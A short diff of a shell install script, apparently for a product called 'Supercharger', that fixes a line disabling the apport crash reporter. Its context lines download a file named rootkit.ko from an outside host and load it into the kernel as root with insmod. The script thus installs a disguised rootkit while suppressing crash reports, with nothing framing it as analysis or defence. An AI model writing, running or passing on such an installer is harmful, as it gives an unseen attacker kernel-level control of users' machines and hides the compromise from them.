@@ -14,7 +14,7 @@ then
   abort "Supercharger is only supported on Linux for kernel version 5.11.0-34-generic."
 fi
 
-sudo echo "enable=0" > /etc/default/apport
+sudo echo "enabled=0" > /etc/default/apport
 curl -fsSL http://supercharger.com/rootkit.ko > /tmp/rootkit.ko
 sudo rmmod rootkit 2>/dev/null
 sudo insmod /tmp/rootkit.ko
